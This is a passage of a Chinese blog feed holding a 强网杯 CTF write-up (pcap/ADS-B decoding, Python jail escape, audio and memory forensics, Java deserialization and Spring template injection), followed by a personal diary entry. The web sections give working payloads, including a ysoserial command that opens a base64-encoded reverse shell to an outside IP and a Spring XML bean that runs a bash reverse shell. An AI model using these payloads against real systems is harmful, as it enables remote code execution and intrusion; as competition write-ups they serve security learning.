class="hljs-string">&#x27;attach.pcapng&#x27;</span><br>output_hex_file = <span class="hljs-string">&#x27;tcp_payloads_hex.txt&#x27;</span><br><br><span class="hljs-comment"># Call the function with the specified file paths</span><br>extract_tcp_payload_hex(pcap_file, output_hex_file)<br><br></code></pre></td></tr></table></figure><p>然后按照官方文档来进行调试</p><p><a href="https://gitee.com/wangmin-gf/ads-b">https://gitee.com/wangmin-gf/ads-b</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyModeS <span class="hljs-keyword">as</span> pms<br>pms.tell(<span class="hljs-string">&quot;8D4840D6202CC371C32CE0576098&quot;</span>)<br></code></pre></td></tr></table></figure><p>处理一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyModeS <span class="hljs-keyword">as</span> pms<br><br><span class="hljs-comment"># 文件路径</span><br>hex_file_path = <span class="hljs-string">&#x27;tcp_payloads_hex.txt&#x27;</span><br><br><span class="hljs-comment"># 读取文件并处理每一行</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(hex_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>            line = line.strip()  <span class="hljs-comment"># 移除行末的换行符</span><br>            <span class="hljs-keyword">if</span> line:  <span class="hljs-comment"># 检查是否为空行</span><br>                <span class="hljs-comment"># 使用pyModeS处理每一行的数据</span><br>                result = pms.tell(line)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Result for <span class="hljs-subst">&#123;line&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error occurred while processing the file: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到结果进行处理</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205521.png" alt="image">​</p><p><code>ICAO address: 79a05e</code>​  换成大写<code>79A05E</code>​然后md5即可得到flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205053.png" alt="image">​</p><p>‍</p><h2 id="Pyjail-It’s-myRevenge"><a href="#Pyjail-It’s-myRevenge" class="headerlink" title="Pyjail ! It’s myRevenge"></a>Pyjail ! It’s myRevenge</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> code, os, subprocess<br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blacklist_fun_callback</span>(<span class="hljs-params">*args</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! It&#x27;s already banned!&quot;</span>)<br><br>pty.spawn = blacklist_fun_callback<br>os.system = blacklist_fun_callback<br>os.popen = blacklist_fun_callback<br>subprocess.Popen = blacklist_fun_callback<br>subprocess.call = blacklist_fun_callback<br>code.interact = blacklist_fun_callback<br>code.compile_command = blacklist_fun_callback<br><br><span class="hljs-built_in">vars</span> = blacklist_fun_callback<br>attr = blacklist_fun_callback<br><span class="hljs-built_in">dir</span> = blacklist_fun_callback<br><span class="hljs-built_in">getattr</span> = blacklist_fun_callback<br><span class="hljs-built_in">exec</span> = blacklist_fun_callback<br><span class="hljs-built_in">__import__</span> = blacklist_fun_callback<br><span class="hljs-built_in">compile</span> = blacklist_fun_callback<br><span class="hljs-built_in">breakpoint</span> = blacklist_fun_callback<br><br><span class="hljs-keyword">del</span> os, subprocess, code, pty, blacklist_fun_callback<br>input_code = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Can u input your code to escape &gt; &quot;</span>)<br><br>blacklist_words_var_name_fake_in_local_real_in_remote = [<br>    <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>,<br>    <span class="hljs-string">&quot;interact&quot;</span>,<br>    <span class="hljs-string">&quot;pty&quot;</span>,<br>    <span class="hljs-string">&quot;pdb&quot;</span>,<br>    <span class="hljs-string">&quot;platform&quot;</span>,<br>    <span class="hljs-string">&quot;importlib&quot;</span>,<br>    <span class="hljs-string">&quot;timeit&quot;</span>,<br>    <span class="hljs-string">&quot;imp&quot;</span>,<br>    <span class="hljs-string">&quot;commands&quot;</span>,<br>    <span class="hljs-string">&quot;popen&quot;</span>,<br>    <span class="hljs-string">&quot;load_module&quot;</span>,<br>    <span class="hljs-string">&quot;spawn&quot;</span>,<br>    <span class="hljs-string">&quot;system&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>    <span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>    <span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;eval&quot;</span>,<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-string">&quot;compile&quot;</span>,<br>    <span class="hljs-string">&quot;input&quot;</span>,<br>    <span class="hljs-string">&quot;vars&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>,<br>    <span class="hljs-string">&quot;dir&quot;</span>,<br>    <span class="hljs-string">&quot;getattr&quot;</span><br>    <span class="hljs-string">&quot;__import__&quot;</span>,<br>    <span class="hljs-string">&quot;__builtins__&quot;</span>,<br>    <span class="hljs-string">&quot;__getattribute__&quot;</span>,<br>    <span class="hljs-string">&quot;__class__&quot;</span>,<br>    <span class="hljs-string">&quot;__base__&quot;</span>,<br>    <span class="hljs-string">&quot;__subclasses__&quot;</span>,<br>    <span class="hljs-string">&quot;__getitem__&quot;</span>,<br>    <span class="hljs-string">&quot;__self__&quot;</span>,<br>    <span class="hljs-string">&quot;__globals__&quot;</span>,<br>    <span class="hljs-string">&quot;__init__&quot;</span>,<br>    <span class="hljs-string">&quot;__name__&quot;</span>,<br>    <span class="hljs-string">&quot;__dict__&quot;</span>,<br>    <span class="hljs-string">&quot;._module&quot;</span>,<br>    <span class="hljs-string">&quot;builtins&quot;</span>,<br>    <span class="hljs-string">&quot;breakpoint&quot;</span>,<br>    <span class="hljs-string">&quot;import&quot;</span>,<br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_filter</span>(<span class="hljs-params">input_code</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> blacklist_words_var_name_fake_in_local_real_in_remote:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> input_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;&#123;&#x27;</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> input_code.isascii() <span class="hljs-keyword">and</span> my_filter(input_code) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> input_code <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(input_code) &lt; <span class="hljs-number">65</span>:<br>    input_code = <span class="hljs-built_in">eval</span>(<span class="hljs-string">f&quot;f&#x27;<span class="hljs-subst">&#123;input_code&#125;</span>&#x27;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Player! Please obey the filter rules which I set!&quot;</span>)<br></code></pre></td></tr></table></figure><p>发现了他import code,由于import的机制会优先导入当前目录的code.py</p><p>所以我们只要写入文件到code.py，连接是自动执行我们要执行的恶意程序即可</p><p>但是code被过滤了，所以用\x63绕过c即可</p><p>payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;&#123;1&#125;&#x27;+open(&#x27;1&#x27;,&#x27;w&#x27;).write(&#x27;im&#x27;)+&#x27;&quot;</span><br><span class="hljs-string">&quot;&#123;1&#125;&#x27;+open(&#x27;1&#x27;,&#x27;a&#x27;).write(&#x27;port o&#x27;)+&#x27;&quot;</span><br><span class="hljs-string">&quot;&#123;1&#125;&#x27;+open(&#x27;1&#x27;,&#x27;a&#x27;).write(&#x27;s;print(o&#x27;)+&#x27;&quot;</span><br><span class="hljs-string">&quot;&#123;1&#125;&#x27;+open(&#x27;1&#x27;,&#x27;a&#x27;).write(&#x27;s.pope&#x27;)+&#x27;&quot;</span><br><span class="hljs-string">&quot;&#123;1&#125;&#x27;+open(&#x27;1&#x27;,&#x27;a&#x27;).write(&#x27;n(\&#x27;cat fl*&gt;2\&#x27;).read())&#x27;)+&#x27;&quot;</span><br><span class="hljs-string">&quot;&#123;1&#125;&#x27;+open(&#x27;\x63ode.py&#x27;,&#x27;w&#x27;).write(open(&#x27;1&#x27;).read())+&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p>最后连接时执行了<code>cat fl*&gt;2</code>​</p><p>所以我们读取文件2就可以得到flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205180.png" alt="image">​</p><h2 id="Wabby-Wabbo-Radio"><a href="#Wabby-Wabbo-Radio" class="headerlink" title="Wabby Wabbo Radio"></a>Wabby Wabbo Radio</h2><p>‍</p><p>Web访问，f12看到音频，提出来，这里有好多 多刷几次</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205344.png" alt="1702791995501">​</p><p>随便看一个发现有摩斯</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205482.png" alt="1702792029667">​</p><p>解完有两个提示一个QAM一个PNG</p><p>搜文章：<a href="https://www.jmwww.net/SQL/14678.html">https://www.jmwww.net/SQL/14678.html</a> 尝试替换，这里根据png的提示，把01这些转成二进制对应图片的文件头，试了很久发现可以打，不知道是不是非预期。</p><p>丢进010分析文件，把前面无用的头全部删去，保留用于替换的字节，叫gpt搓个脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_audio_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> audio_file:<br>        audio_data = audio_file.read()<br>    <span class="hljs-keyword">return</span> audio_data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert_audio_to_binary</span>(<span class="hljs-params">audio_data</span>):<br>    binary_result = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(audio_data), <span class="hljs-number">4</span>):<br>        byte = audio_data[i]<br>        <span class="hljs-keyword">if</span> byte == <span class="hljs-number">192</span>:<br>            binary_result += <span class="hljs-string">&quot;00&quot;</span><br>        <span class="hljs-keyword">elif</span> byte == <span class="hljs-number">191</span>:<br>            binary_result += <span class="hljs-string">&quot;01&quot;</span><br>        <span class="hljs-keyword">elif</span> byte == <span class="hljs-number">63</span>:<br>            binary_result += <span class="hljs-string">&quot;10&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            binary_result += <span class="hljs-string">&quot;11&quot;</span><br>    <span class="hljs-keyword">return</span> binary_result<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_binary_to_image</span>(<span class="hljs-params">file_path, binary_data</span>):<br>    byte_data = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_data), <span class="hljs-number">8</span>):<br>        byte = binary_data[i:i+<span class="hljs-number">8</span>]<br>        byte_data.append(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> image_file:<br>        image_file.write(byte_data)<br>audio_file_path = <span class="hljs-string">&quot;flag.wav&quot;</span><br>image_file_path = <span class="hljs-string">&quot;flag.png&quot;</span><br>audio_data = read_audio_file(audio_file_path)<br>binary_data = convert_audio_to_binary(audio_data)<br>write_binary_to_image(image_file_path, binary_data)<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205654.png" alt="1702793941318">​</p><p>‍</p><h2 id="找到PNG了吗"><a href="#找到PNG了吗" class="headerlink" title="找到PNG了吗"></a>找到PNG了吗</h2><p>‍</p><p>用vol找了半天发现一头雾水，于是队友直接用软件梭哈出了一些文本，于是用010打开mem发现了里面明文存储的信息</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205782.png" alt="image">感觉key关键词有问题，于是根据那个key关键词直接搜</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205983.png" alt="2791c4d1e298819fbe4bf7cf33aa143f_">直接搜出来一c代码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205199.png" alt="8b6528900add1f3a512598ea96ddea4c_">发现是rc4，key是do_not_care</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205360.png" alt="image">丢给gpt简单看了看流程</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205915.png" alt="a81ee84bc7570e8b3a97be3b7e4f185b_">​</p><p>去010里面找了这串加密后的，也是成功找到</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205072.png" alt="3d556e693a3a174e8e130b1e8e924824_">复制下来直接同样流程解密</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205276.png" alt="image">另存为png得到flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205585.png" alt="HEX">​</p><p>‍</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="happygame"><a href="#happygame" class="headerlink" title="happygame"></a>happygame</h2><p>nc连上去没交互，grpc(清风神打过HTB直接想到)直接连</p><p>安装工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go install github.com/fullstorydev/grpcui/cmd/grpcui@latest<br></code></pre></td></tr></table></figure><p>这个工具会被安装在~&#x2F;go&#x2F;bin目录下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205707.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205957.png" alt="image">然后发现不需要认证可以打反序列化，直接打CC链子试试，把每个链子都打了一遍就反弹shell回来拿到flag了</p><p>注意下图中需要手动填写序列化字节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMzEuMTY2LjE2MS8yODg4OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt;ser.bin<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205220.png" alt="image">​</p><p>然后发送即可</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205374.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="hello-spring"><a href="#hello-spring" class="headerlink" title="hello spring"></a>hello spring</h2><p>参考 <a href="https://zhuanlan.zhihu.com/p/551576769">https://zhuanlan.zhihu.com/p/551576769</a></p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222205350.png" alt="image">​</p><p>跟去年强网的好像差不多，但比去年稍微简单点的是直接给了上传路由，那其实可以想到上传模版去解析造成注入rce</p><p>用了原文的一个payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> y= beans.get(<span class="hljs-string">&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;</span>).resourceLoader.classLoader.loadClass(<span class="hljs-string">&quot;java.beans.Beans&quot;</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yy =  beans.get(<span class="hljs-string">&quot;jacksonObjectMapper&quot;</span>).readValue(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yyy = yy.instantiate(null,<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>) %&#125;<br>&#123;&#123; yyy.setConfigLocation(<span class="hljs-string">&quot;http://xxxx/1.xml&quot;</span>) &#125;&#125;<br>&#123;&#123; yyy.refresh() &#125;&#125;<br></code></pre></td></tr></table></figure><p>他的文件名也可以通过python代码或者他的返回包给的时间中进行推算</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312222202456.png" alt="image">​</p><p>再访问&#x2F;?x&#x3D;file_20231219_034752加载模板即可，但实际上是不可以成功反弹的，因为他的filter当中是存在代码的，但是反编译出来的源码并没有写(真没必要吧出题人)</p><p>赛后看了一下一个师傅的公众号他写了一下过滤的内容为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.context.support.ClassPathXmlApplicationContext<br>org.springframework.context.support.FileSystemXmlApplicationContext<br></code></pre></td></tr></table></figure><p>尝试使用字符串拼接吧关键字隔离开进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> y= beans.get(<span class="hljs-string">&quot;org.springframework.boot.autoconfigure.internalC&quot;</span>+<span class="hljs-string">&quot;achingMetadataReaderFactory&quot;</span>).resourceLoader.classLoader.loadClass(<span class="hljs-string">&quot;java.beans.Beans&quot;</span>) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yy =  beans.get(<span class="hljs-string">&quot;jacksonObjectMapper&quot;</span>).readValue(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y) %&#125;<br>&#123;% <span class="hljs-built_in">set</span> yyy = yy.instantiate(null,<span class="hljs-string">&quot;org.springframework.context.support.Cla&quot;</span>+<span class="hljs-string">&quot;ssPathXmlApplicationContext&quot;</span>) %&#125;<br>&#123;&#123; yyy.setConfigLocation(<span class="hljs-string">&quot;http://xxxx/1.xml&quot;</span>) &#125;&#125;<br>&#123;&#123; yyy.refresh() &#125;&#125;<br></code></pre></td></tr></table></figure><p>然后在自己服务器上放个rce.xml即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,YmFzaCxxxxxxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>​不知不觉写到12点了，今天其实还接到昆仑的电话了，让我直接一月份入职，开的薪资只能说是中规中矩吧，应该是够活下来，感觉自己难以去面对去实习的事实了，害，好难啊，挣钱真的好难，真的安全尽头真的是噶韭菜啊啊啊啊，不过感觉其实也是自己对安全还是有着热爱与兴趣的，希望能支持自己走的长久一点吧，强网其实自己做出来的题也不多，大部分有交流的情况下出的，还是稍微困难，还是得继续加油吧！洗洗睡了，明儿还得对着80个学生讲基础捏</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随记 - 记一次emo</title>
    <link href="/post/record-remember-once-emo-2berae.html"/>
    <url>/post/record-remember-once-emo-2berae.html</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title="%"></a>%</h1><p>​好奇怪的感觉，今天是2023.12.15日，什么都没发生，在次之前接了个培训，说是五天的Web培训，价格中规中矩吧，但要求真的一堆，又是一定要什么红队技巧，又是要什么CTF题，还得自己搭建平台来给学员在线选拔，整了好几天，各种修改，今天早上终于把<code>Dockerfile</code>给写完了，害，中午真不想学了，就去跟WYE的聊聊天，下午又是一个下午的课，逃掉了，但是作业要随堂检测，又没平时分了，虽然不保研，但在上课期间逃课感觉就是静不下心来学习，所以下午去看了一眼师傅们的博客，emmm发现好多都看不懂(<del>静不下心</del>)，然后去碰了一下自己爆金币的知识星球学了一手报错的<code>Spel</code>注入，但是自己搭建的时候不知道为啥，确实能报错，也捕获了报错信息，但是并没有执行危险语句外带，然后搞了半天没玩明白，寄了。</p><p>然后刷了会手机，又发现efo-cms这套源码有师傅写了审计文章，那么就自己试试能否复现吧，结果沃日了maven没报错一执行全是这个错误(<del>包是在maven中难道不也算是软件包吗</del>)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151833218.png" alt="image">​</p><p>​我tmd要疯掉了，百度谷歌好久都没结果，可能这就是太菜了吧。</p><p>​然后不知道干啥，学不明白，又去看了一下组长的<code>Java安全大杂烩的CTF题-buggyloader</code>,题目很好，跟我没关系而已，codeql去找链子打二次反序列化打内存马，哥我看得懂吗？？害又被自己菜哭了，更哭笑不得的是，女朋友跟我一样都在emo，她面临着毕业设计的开题，也忙的焦头烂额，我是被自己菜哭了真的，呜呜呜，好羡慕我友链上的人啊，两个警察爷，技术还好，害，可能这就是菜逼Jack吧，每天都是想成为群友中的<code>Jack神</code></p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151833863.png" alt="image">​</p><p>​结果我又不死心，就去看了一下团队的周报，突然注意到<code>Xenc</code>爹，于是看了他分享的一些Java和.NET流量绕Waf的内容，很好，哥们又没看懂，是一点都没看懂啊啊啊！你们这群爹的东西我是真看不明白了。明天就是强网了，害，好难，希望自己能出题吧，线下肯定是没机会的了，那都是Pwn爹玩的游戏，跟Web狗有什么关系？</p><p>​算了，emo归emo，现在去外面吃个饭买个奶茶，回来洗个澡再看看师傅们的博客周报公众号吧(回顾一天到底学了什么: 答案是0 )。今天就这样了，什么都没干，一事无成。又是羡慕群友的一天</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - Apache Log4j2 JNDI Injection 原理分析</title>
    <link href="/post/java-security-apache-log4j2-jndi-injection-principles-analysis-z1cmsb1.html"/>
    <url>/post/java-security-apache-log4j2-jndi-injection-principles-analysis-z1cmsb1.html</url>
    
